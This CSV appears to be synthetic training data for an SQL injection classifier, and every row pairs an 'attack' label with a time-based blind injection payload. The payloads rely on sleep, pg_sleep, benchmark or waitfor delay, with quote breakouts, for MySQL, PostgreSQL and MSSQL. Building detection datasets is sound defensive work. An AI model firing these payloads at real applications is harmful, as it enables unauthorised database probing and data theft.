id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000344,attack,time,"select pg_sleep  (  5  )   and ""%""  =  """,nearest_attack_euclidean,R000347,0.3656914802438985
SMOTE_000345,attack,time,1%'  )   or sleep  (  5  )   and   (  '%'  =  ',nearest_attack_euclidean,R000177,0.60299554882705
SMOTE_000346,attack,time,1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000635,0.09199927220242732
SMOTE_000347,attack,time,1  )   where 6950  =  6950 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,nearest_attack_euclidean,R000585,0.38636827447552197
SMOTE_000348,attack,time,1' rlike sleep  (  5  )   and 'cugs'  =  'cugs,nearest_attack_euclidean,R000195,0.583795774497334
SMOTE_000349,attack,time,1' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000599,0.9097141497357933
SMOTE_000350,attack,time,1'+  (  select qpaf where 7859  =  7859 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu   )    )   +',nearest_attack_euclidean,R000376,0.002366078428137566
SMOTE_000351,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and 'mabd'  =  'mabd,nearest_attack_euclidean,R000197,1.1035355247289405
SMOTE_000352,attack,time,1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,nearest_attack_euclidean,R000489,0.14505740437914993
SMOTE_000353,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.019329641051883287
SMOTE_000354,attack,time,"1"" where 1683  =  1683 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000683,0.8606948558895517
SMOTE_000355,attack,time,1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000687,0.9442250294544585
SMOTE_000356,attack,time,1 where 1931  =  1931 and sleep  (  5  )  --,nearest_attack_euclidean,R000727,0.41975034545691864
SMOTE_000357,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.23117842499676555
SMOTE_000358,attack,time,"1'   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000612,0.714703230289574
SMOTE_000359,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,0.588334167063467
SMOTE_000360,attack,time,"1""   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   ""cowu"" like ""cowu",nearest_attack_euclidean,R000461,0.48756601474927036
SMOTE_000361,attack,time, )   or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000032,0.9776950290632597
SMOTE_000362,attack,time,"1  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000449,0.2641833456223546
SMOTE_000363,attack,time,"1   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   8280  =  8280",nearest_attack_euclidean,R000531,1.4134635249516179
SMOTE_000364,attack,time,"1""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""btht""  =  ""btht",nearest_attack_euclidean,R000770,0.2885806173320049
SMOTE_000365,attack,time,1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000582,0.5035037244002206
SMOTE_000366,attack,time,"waitfor delay '0:0:5' and    (    (     (  ""mfro"" like ""mfro",nearest_attack_euclidean,R000268,0.3456832677855926
SMOTE_000367,attack,time,"1  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000581,0.3137250817667548
SMOTE_000368,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and ""vzft""  =  ""vzft",nearest_attack_euclidean,R000215,0.3343299690770705
SMOTE_000369,attack,time,"1""   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000633,0.5603850718153436
SMOTE_000370,attack,time,"1""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""ijag""  =  ""ijag",nearest_attack_euclidean,R000108,0.8943396452341958
SMOTE_000371,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000350,0.2030572144929157
SMOTE_000372,attack,time,select pg_sleep  (  5  )   and    (    (   4382  =  4382,nearest_attack_euclidean,R000419,0.17331034169467252
SMOTE_000373,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000072,0.6635968566226161
SMOTE_000374,attack,time,waitfor delay '0:0:5'--,nearest_attack_euclidean,R000265,0.104511581448302
SMOTE_000375,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,0.03315918021193259
SMOTE_000376,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R000760,1.02852018110705
SMOTE_000377,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,1.0203381940218796
SMOTE_000378,attack,time,1  )   where 8320  =  8320 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000234,0.017590963354688238
SMOTE_000379,attack,time,"1%'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000171,0.2704178452113064
SMOTE_000380,attack,time,"1""   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  ""rsru""  =  ""rsru",nearest_attack_euclidean,R000517,1.2696971734985973
SMOTE_000381,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.21785998826681183
SMOTE_000382,attack,time,waitfor delay '0:0:5' and    (    (   7619  =  7619,nearest_attack_euclidean,R000282,1.5841038583567095
SMOTE_000383,attack,time,"1' where 7014  =  7014 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000528,0.9528349809856322
SMOTE_000384,attack,time,1'+  (  select 'mdxt' where 2733  =  2733 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000417,0.8718406390685325
SMOTE_000385,attack,time,1'+  (  select 'ymgm' where 8204  =  8204 and sleep  (  5  )  #,nearest_attack_euclidean,R000220,0.13021635487799657
SMOTE_000386,attack,time,1'||  (  select 'xglm' from dual where 3556  =  3556 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000630,1.7313308862428607
SMOTE_000387,attack,time,waitfor delay '0:0:5' and    (    (   7619  =  7619,nearest_attack_euclidean,R000282,0.2340206444421342
SMOTE_000388,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and 'mabd'  =  'mabd,nearest_attack_euclidean,R000197,0.709097158895621
SMOTE_000389,attack,time,"1' in boolean mode  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   #",nearest_attack_euclidean,R000404,0.9930980390894898
SMOTE_000390,attack,time,"1"" and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ",nearest_attack_euclidean,R000497,1.2063204601733628
SMOTE_000391,attack,time,"1%'  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000208,0.859438540083844
SMOTE_000392,attack,time,1'  )   as inid where 7812  =  7812 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000136,0.37445865658771
SMOTE_000393,attack,time,"1"" where 2547  =  2547 or sleep  (  5  )  #",nearest_attack_euclidean,R000600,0.5210552591845403
SMOTE_000394,attack,time,1%' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000297,0.2777871328007842
SMOTE_000395,attack,time,1'   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  'ineq' like 'ineq,nearest_attack_euclidean,R000356,0.2629891502723496
SMOTE_000396,attack,time, (  7098  =  7098 and sleep  (  5   )    ) ,nearest_attack_euclidean,R000775,0.8156399890976991
SMOTE_000397,attack,time,"1"" where 6200  =  6200 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000471,0.24636232753297505
SMOTE_000398,attack,time,1'   )    )    waitfor delay '0:0:5' and    (    (   'amnf' like 'amnf,nearest_attack_euclidean,R000554,0.6781908513907854
SMOTE_000399,attack,time,1  )   as mixt where 1085  =  1085 or sleep  (  5  )  --,nearest_attack_euclidean,R000710,1.1756991204599765
SMOTE_000400,attack,time,"1""  )   as gdcx where 2335  =  2335 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000142,0.048824512508680536
SMOTE_000401,attack,time,1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and 'iwmy'  =  'iwmy,nearest_attack_euclidean,R000749,1.0743648185806596
SMOTE_000402,attack,time,"1"" rlike sleep  (  5  )  #",nearest_attack_euclidean,R000359,0.6281504258778812
SMOTE_000403,attack,time,"1%""   )    )    and sleep  (  5  )  #",nearest_attack_euclidean,R000650,0.3217608046314918
SMOTE_000404,attack,time,"1   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000240,0.35060291741346594
SMOTE_000405,attack,time,select sleep  (  5  )   and 'gajm'  =  'gajm,nearest_attack_euclidean,R000207,0.4883297308968357
SMOTE_000406,attack,time,"1'   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  'ayjb' like 'ayjb",nearest_attack_euclidean,R000438,0.8977014625360091
SMOTE_000407,attack,time,1'   )    )     )   or sleep  (  5  )  #,nearest_attack_euclidean,R000504,0.32500401124890016
SMOTE_000408,attack,time,"1 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000576,0.16950204800900276
SMOTE_000409,attack,time,1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  -- ybmz,nearest_attack_euclidean,R000150,0.10149985037836197
SMOTE_000410,attack,time,"1'   )    )    as lmsl where 3753  =  3753 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000203,0.2210648262665773
SMOTE_000411,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.16476469518728512
SMOTE_000412,attack,time,select sleep  (  5  )   and   (  1435  =  1435,nearest_attack_euclidean,R000602,0.014894078378731052
SMOTE_000413,attack,time,"1' where 7014  =  7014 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000528,0.8621252375593778
SMOTE_000414,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf",nearest_attack_euclidean,R000709,0.07421391480728867
SMOTE_000415,attack,time,"waitfor delay '0:0:5' and ""lhcv""  =  ""lhcv",nearest_attack_euclidean,R000568,0.7783633503274091
SMOTE_000416,attack,time,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,nearest_attack_euclidean,R000590,0.028876826705327933
SMOTE_000417,attack,time,1 and sleep  (  5  )  # qcyj,nearest_attack_euclidean,R000589,0.7642178491798469
SMOTE_000418,attack,time,sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000041,0.7473410084847026
SMOTE_000419,attack,time,1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and 'ukoc' like 'ukoc,nearest_attack_euclidean,R000227,0.4012656708083365
SMOTE_000420,attack,time,1   )    )    as emtf where 3561  =  3561 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,nearest_attack_euclidean,R000751,1.1596494593009836
SMOTE_000421,attack,time,1   )    )    as uvep where 6016  =  6016 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000458,0.37660781856209463
SMOTE_000422,attack,time,"1   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  2341  =  2341",nearest_attack_euclidean,R000257,0.11177800286200147
SMOTE_000423,attack,time,1 where 8921  =  8921 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,nearest_attack_euclidean,R000163,0.3443803602845205
SMOTE_000424,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'dvpw'  =  'dvpw",nearest_attack_euclidean,R000767,0.6045589967072078
SMOTE_000425,attack,time,"1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'ogpg'  =  'ogpg",nearest_attack_euclidean,R000562,0.5792547750170532
SMOTE_000426,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   ",nearest_attack_euclidean,R000561,0.18108865662799384
SMOTE_000427,attack,time,"1%""  )   and sleep  (  5  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000714,1.162048647866969
SMOTE_000428,attack,time,"1   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  9558  =  9558",nearest_attack_euclidean,R000101,0.8514303566427212
SMOTE_000429,attack,time,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""baia""  =  ""baia",nearest_attack_euclidean,R000046,0.3370374542310147
SMOTE_000430,attack,time,"1""   )    )     )   or sleep  (  5  )   and    (    (     (  ""eran""  =  ""eran",nearest_attack_euclidean,R000164,0.2782008737335066
SMOTE_000431,attack,time,1  )   as mixt where 1085  =  1085 or sleep  (  5  )  --,nearest_attack_euclidean,R000710,0.8153135423946434
SMOTE_000432,attack,time,1%'   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000583,0.9708000794131779
SMOTE_000433,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,0.04668399076712528
SMOTE_000434,attack,time,1' where 4473  =  4473 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000453,0.553068455372503
SMOTE_000435,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'kerg' like 'kerg,nearest_attack_euclidean,R000427,0.23189184137086669
SMOTE_000436,attack,time,1' waitfor delay '0:0:5'--,nearest_attack_euclidean,R000156,1.2259954183231507
SMOTE_000437,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,nearest_attack_euclidean,R000096,0.2119622427758042
SMOTE_000438,attack,time,"1'+  (  select 'iyvn' where 9358  =  9358 or elt  (  6272  =  6272,sleep  (  5   )    )     )  +'",nearest_attack_euclidean,R000083,0.024148235810897273
SMOTE_000439,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'dvpw'  =  'dvpw",nearest_attack_euclidean,R000767,0.18720367396543092
SMOTE_000440,attack,time,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000077,0.007557414866951069
SMOTE_000441,attack,time,"1""   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000355,1.2079873329451916
SMOTE_000442,attack,time,"1'+  (  select aahc where 5436  =  5436 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )     )  +'",nearest_attack_euclidean,R000519,0.12995300381949718
SMOTE_000443,attack,time,"1'+  (  select 'kqnj' where 9483  =  9483 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000432,0.4392432458997149
SMOTE_000444,attack,time,"1%"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000149,0.1947681180811066
SMOTE_000445,attack,time,1  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000462,0.7902445078600757
SMOTE_000446,attack,time,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""cneo"" like ""cneo",nearest_attack_euclidean,R000076,0.3170706439084202
SMOTE_000447,attack,time,1  )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000399,0.780162788069175
SMOTE_000448,attack,time,"1""  )   as rnjx where 2679  =  2679 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000081,0.43461315816691304
SMOTE_000449,attack,time,1' or sleep  (  5  ) ,nearest_attack_euclidean,R000742,1.2057606866999997
SMOTE_000450,attack,time,"select sleep  (  5  )   and   (  ""innk""  =  ""innk",nearest_attack_euclidean,R000219,0.3749407451868855
SMOTE_000451,attack,time,1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000306,1.01161520760313
SMOTE_000452,attack,time,"1"" where 2547  =  2547 or sleep  (  5  )  #",nearest_attack_euclidean,R000600,1.2283590652856828
SMOTE_000453,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.3393819937211512
SMOTE_000454,attack,time,"1   )    )    as cusv where 4871  =  4871 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000123,0.25371855500323875
SMOTE_000455,attack,time,"1""   )    )    as whyr where 9731  =  9731 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --",nearest_attack_euclidean,R000666,0.22721359344613995
SMOTE_000456,attack,time,1' and sleep  (  5  )   and 'usgv' like 'usgv,nearest_attack_euclidean,R000190,1.0054115591697723
SMOTE_000457,attack,time,1' waitfor delay '0:0:5'--,nearest_attack_euclidean,R000156,0.10528527414070862
SMOTE_000458,attack,time,"1%'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000674,0.5646443458244017
SMOTE_000459,attack,time,1  )   as xwgf where 4204  =  4204 and sleep  (  5  )  --,nearest_attack_euclidean,R000580,0.5765610386339877
SMOTE_000460,attack,time,1  )   where 2468  =  2468 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000657,0.22150723958900592
SMOTE_000461,attack,time,1  )   as xwgf where 4204  =  4204 and sleep  (  5  )  --,nearest_attack_euclidean,R000580,0.4085448418560332
SMOTE_000462,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,0.023872246186783675
SMOTE_000463,attack,time,1' in boolean mode  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000451,0.05520865897727638
SMOTE_000464,attack,time,1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   'vpqr'  =  'vpqr,nearest_attack_euclidean,R000459,0.5315913649609478
SMOTE_000465,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000290,1.1426960629652363
SMOTE_000466,attack,time,1'+  (  select echl where 6593  =  6593 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000169,0.7346816497836068
SMOTE_000467,attack,time,1' rlike sleep  (  5  )   and 'cugs'  =  'cugs,nearest_attack_euclidean,R000195,0.49635762067980976
SMOTE_000468,attack,time,select sleep  (  5  ) ,nearest_attack_euclidean,R000361,0.7215053791615424
SMOTE_000469,attack,time,"1""  )   as rdvm where 6360  =  6360 and sleep  (  5  )  --",nearest_attack_euclidean,R000394,0.0493017769921015
SMOTE_000470,attack,time,1'||  (  select 'ocmk' from dual where 3961  =  3961 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  ||',nearest_attack_euclidean,R000506,0.5428031161521412
SMOTE_000471,attack,time,1'  )   as inid where 7812  =  7812 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000136,1.1396143571790067
SMOTE_000472,attack,time," select sleep  (  5  )   and   (  ""tlbp""  =  ""tlbp",nearest_attack_euclidean,R000229,1.2223190357356466
SMOTE_000473,attack,time,"1""  )   or sleep  (  5  )   and   (  ""fiag"" like ""fiag",nearest_attack_euclidean,R000239,0.34105911598095806
SMOTE_000474,attack,time,1'+  (  select 'sbji' where 7989  =  7989 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +',nearest_attack_euclidean,R000209,0.47330398098792464
SMOTE_000475,attack,time,1'||  (  select 'xglm' from dual where 3556  =  3556 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000630,0.8224065895023589
SMOTE_000476,attack,time,1%'   )    )    or sleep  (  5  )   and    (    (   '%'  =  ',nearest_attack_euclidean,R000734,0.28979540258048486
SMOTE_000477,attack,time,"select sleep  (  5  )   and    (    (   ""vzye""  =  ""vzye",nearest_attack_euclidean,R000243,0.8206079058350901
SMOTE_000478,attack,time,1'  )   where 1645  =  1645 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000307,0.5276591135600278
SMOTE_000479,attack,time,1%'  )   or sleep  (  5  )   and   (  '%'  =  ',nearest_attack_euclidean,R000177,1.1336588549739421
SMOTE_000480,attack,time, (  7098  =  7098 and sleep  (  5   )    ) ,nearest_attack_euclidean,R000775,0.6736057908943042
SMOTE_000481,attack,time,1' waitfor delay '0:0:5'--,nearest_attack_euclidean,R000156,0.5582647645115115
SMOTE_000482,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   # awpq,nearest_attack_euclidean,R000475,3.4929389823365533e-05
SMOTE_000483,attack,time,select pg_sleep  (  5  )   and   (  1044  =  1044,nearest_attack_euclidean,R000476,0.5275774848681986
SMOTE_000484,attack,time,"1%""   )    )    rlike sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000729,0.36946245731282407
SMOTE_000485,attack,time,1'  )   as inid where 7812  =  7812 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000136,0.9289665181104118
SMOTE_000486,attack,time,1'+  (  select ahyw where 6893  =  6893 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000172,1.0442835988291235
SMOTE_000487,attack,time,1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and '%'  =  ',nearest_attack_euclidean,R000085,0.2277598114918658
SMOTE_000488,attack,time,"1'  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000333,0.17437287342910404
SMOTE_000489,attack,time,"1""  )   as rnjx where 2679  =  2679 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000081,0.49565022229459094
SMOTE_000490,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )    and ""hvic"" like ""hvic",nearest_attack_euclidean,R000556,0.8328887817351421
SMOTE_000491,attack,time,1  )   as xwgf where 4204  =  4204 and sleep  (  5  )  --,nearest_attack_euclidean,R000580,0.32063524159704365
SMOTE_000492,attack,time,1'+  (  select 'jtvq' where 8288  =  8288 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000198,0.27184920939774365
SMOTE_000493,attack,time,"1'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000126,0.5802155016437534
SMOTE_000494,attack,time,"1'||  (  select 'qwoo' from dual where 8802  =  8802 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",nearest_attack_euclidean,R000247,0.6771325796525773
SMOTE_000495,attack,time,1 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000541,0.8529765814773775
SMOTE_000496,attack,time,1%'   )    )    or sleep  (  5  )   and    (    (   '%'  =  ',nearest_attack_euclidean,R000734,0.8999477330959647
SMOTE_000497,attack,time,1'   )    )    as hpta where 5376  =  5376 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000656,0.23333510203396962
SMOTE_000498,attack,time,"1 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000576,0.7051640464307259
SMOTE_000499,attack,time,"1%""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R000180,0.4582506528381422
SMOTE_000500,attack,time,"1%""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000565,0.09194169984201062
